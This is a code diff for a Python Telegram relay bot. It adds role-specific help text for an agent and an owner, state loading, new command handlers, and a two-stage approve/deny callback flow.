+async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user = update.effective_user
+    if is_agent(user):
+        await update.message.reply_text(
+            "❓ <b>Help</b>\n\n"
+            "• New requests will appear with approve/deny buttons.\n"
+            "• To reply: <b>long-press their message → Reply</b>.\n"
+            "• 📋 People — see everyone connected.",
+            parse_mode="HTML",
+        )
+    elif is_owner(user):
+        await update.message.reply_text(
+            "❓ <b>Help</b>\n\n"
+            "• You receive copies of all messages (📥 incoming, 📤 outgoing).\n"
+            "• After agent approves someone, you get the final approve/deny.\n"
+            "• If agent denies, you can still override and approve.\n"
+            "• 📋 People / 📊 Status for overview.",
+            parse_mode="HTML",
+        )
 
 
 # ── Main ───────────────────────────────────────────────────────────────────────
 
 def main():
+    load_state()
+    logger.info(
+        f"Loaded: owner={state['owner_id']}, "
+        f"agent={state['agent_id']}, "
+        f"clients={len(state['clients'])}"
+    )
     app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("start",   start))
-    app.add_handler(CommandHandler("status",  status))
-    app.add_handler(CommandHandler("approve", cmd_approve))
-    app.add_handler(CommandHandler("revoke",  cmd_revoke))
+    app.add_handler(CommandHandler("status",  cmd_status))
+    app.add_handler(CommandHandler("clients", cmd_clients))
     app.add_handler(CommandHandler("help",    help_command))
-    app.add_handler(CallbackQueryHandler(on_approval, pattern="^(approve|deny)_"))
+    app.add_handler(CallbackQueryHandler(on_callback, pattern=r"^(ag|ow)_(approve|deny)_|^settarget_"))
     app.add_handler(MessageHandler(filters.ALL & ~filters.COMMAND, relay))
-    app.add_handler(MessageHandler(filters.UpdateType.EDITED_MESSAGE, relay_edit))
-    logger.info("Bot running...")
+    logger.info("Bot running…")
     app.run_polling(drop_pending_updates=False)
 
 if __name__ == "__main__":
